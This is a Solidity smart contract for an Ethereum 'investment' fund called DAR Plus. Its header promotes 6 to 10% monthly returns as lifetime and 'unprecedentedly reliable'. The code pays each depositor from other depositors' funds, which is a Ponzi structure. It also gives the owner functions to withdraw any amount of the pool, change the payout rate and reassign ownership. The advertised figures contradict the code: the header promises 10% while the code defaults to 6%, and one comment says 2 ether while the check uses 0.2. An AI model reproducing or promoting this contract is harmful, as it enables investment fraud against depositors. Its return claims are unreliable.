pragma solidity ^0.5.7;

/**
*Get 6 to 10 % profit every month with the DAR plus contract!
*The higher the fund of the smart contract - the higher the user percentage!
*
* - OBTAINING 10% PER 1 MONTH. (percentages are charged in equal parts every 1 sec)
* 0.3333% per 1 day
* 0.01375% per 1 hour
* 0.000225% per 1 minute
* 0.0000038% per 1 sec
* - lifetime payments
* - unprecedentedly reliable
* - bring luck
* - first minimum contribution from 0.2 eth, all next from 0.01 eth
* - Currency and Payment - ETH
* - Contribution allocation schemes:
* - 100% of payments - 5% percent for support and 10% percent referral system.
* 
* You can purchase DAR Token on a smart contract (the first truly decentralized exchange), 
* and also become a co-owner of the token at the address on the Ethereum blockchain
* 0x690dc006646E69Ba5286299E7F16b3aA298bE59c
*
* RECOMMENDED GAS LIMIT: 200,000
* RECOMMENDED GAS PRICE: https://ethgasstation.info/
* DO NOT TRANSFER DIRECTLY FROM AN EXCHANGE (only use your ETH wallet, from which you have a private key)
* You can check payments on the website etherscan.io, in the “Internal Txns” tab of your wallet.
*
* Referral system 10%.
* Payments to developers 5%

* Restart of the contract is also absent. If there is no money in the Fund, payments are stopped and resumed after the Fund is filled. Thus, the contract will work forever!
*
* How to use:
* 1. Send from your ETH wallet to the address of the smart contract
* Any amount from 0.2 ETH.
* 2. Confirm your transaction in the history of your application or etherscan.io, indicating the address of your wallet.
* Take profit by sending 0 eth to contract (profit is calculated every second).
*
* https://github.com/alexburndev/poker/blob/master/darplus.sol
* Developed by Alex Burn.
**/

contract ERC20Token
{
    mapping (address => uint256) public balanceOf;
    function transfer(address _to, uint256 _value) public;
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

contract DAR_Plus
{
    using SafeMath for uint256;
    
    address payable public owner = 0x76E40e08e10c8D7D088b20D26349ec52932F8BC3;
    
    uint256 public minBalance = 1000;
    ERC20Token DAR_Token = ERC20Token(0x0BC1eb8fFDb29d98E6d0CE833428be04AaaE8345);//0x690dc006646E69Ba5286299E7F16b3aA298bE59c);
    uint8 public P = 6;

    
    struct InvestorData {
        uint256 funds;
        uint256 lastDatetime;
        uint256 totalProfit;
    }
    mapping (address => InvestorData) investors;
    
    modifier onlyOwner()
    {
        assert(msg.sender == owner);
        _;
    }
    
   
    
    function withdraw(uint256 amount)  public onlyOwner {
        owner.transfer(amount);
    }
    
    function changeOwner(address payable newOwner) public onlyOwner {
        owner = newOwner;
    }
    
    function changeMinBalance(uint256 newMinBalance) public onlyOwner {
        minBalance = newMinBalance;
    }
    
    function changeP(uint8 newP) public onlyOwner {
        P = newP;
    }
    
    function bytesToAddress(bytes memory bys) private pure returns (address payable addr) {
        assembly {
          addr := mload(add(bys,20))
        } 
    }
    // function for transfer any token from contract
    function transferTokens (address token, address target, uint256 amount) onlyOwner public
    {
        ERC20Token(token).transfer(target, amount);
    }
    
    function getInfo(address investor) view public returns (uint256 Token_min_Balance, uint8 Procent_per_month, 
    uint256 totalFunds, uint256 pendingReward, uint256 totalProfit)
    {
        InvestorData memory data = investors[investor];
        Token_min_Balance = minBalance;
        Procent_per_month = P;
        totalFunds = data.funds;
        if (data.funds > 0) pendingReward = data.funds.mul(P).div(100).mul(block.timestamp - data.lastDatetime).div(30 days);
        totalProfit = data.totalProfit;
        
    }
    
    function() payable external
    {
        assert(msg.sender == tx.origin); // prevent bots to interact with contract
        
        if (msg.sender == owner) return;
        
        assert(DAR_Token.balanceOf(msg.sender) >= minBalance * 10**18);
        
        
        InvestorData storage data = investors[msg.sender];
        
        if (msg.value > 0)
        {
            // first investment at least 2 ether, all next at least 0.01 ether
            assert(msg.value >= 0.2 ether || (data.funds != 0 && msg.value >= 0.01 ether));
            if (msg.data.length == 20) {
                address payable ref = bytesToAddress(msg.data);
                assert(ref != msg.sender);
                ref.transfer(msg.value.mul(10).div(100));   // 10%
                owner.transfer(msg.value.mul(5).div(100));  // 5%
            } else if (msg.data.length == 0) {
                owner.transfer(msg.value.mul(15).div(100));
            } else {
                assert(false); // invalid memo
            }
        }
        
        
        if (data.funds != 0) {
            // 6-100% per 30 days
            uint256 reward = data.funds.mul(P).div(100).mul(block.timestamp - data.lastDatetime).div(30 days);
            data.totalProfit = data.totalProfit.add(reward);
            
            address(msg.sender).transfer(reward);
        }

        data.lastDatetime = block.timestamp;
        data.funds = data.funds.add(msg.value.mul(85).div(100));
        
    }
}
